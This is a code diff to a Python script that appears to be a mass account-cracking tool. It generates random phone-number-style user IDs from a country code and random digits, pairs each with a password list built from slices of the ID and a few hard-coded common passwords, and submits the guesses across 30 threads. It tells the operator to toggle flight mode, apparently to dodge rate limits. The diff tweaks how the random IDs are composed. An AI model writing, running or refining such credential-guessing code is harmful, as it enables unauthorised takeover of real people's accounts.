@@ -381,7 +381,7 @@ def india():
 		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G} ');linex()
 		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
 		for nmbr in range(limit):
-			nmp = "". join(random.choice(string.digits) for _ in range(6))
+			nmp = "". join(random.choice(string.digits) for _ in range(4))
 			user.append(nmp)
 		with tred(max_workers=30) as habib:	
 			clear()
@@ -390,7 +390,9 @@ def india():
 			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ID :{A} {tl} ')
 			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE [ON/OF] YOUR FLIGHT MODE');linex()
 			for psx in user:
-				uid = code+psx
+				name = ''.join(random.choice(string.digits) for _ in range(2))
+				cod = ''.join(random.choice(string.digits) for _ in range(2))
+				uid = code+name+cod+psx
 				passlist = [uid[:6],uid[:8],uid,uid[2:],uid[4:],'57273200','59039200','57575751']
 				if mthd in ['1','01']:
 					habib.submit(rndm1,uid,passlist)
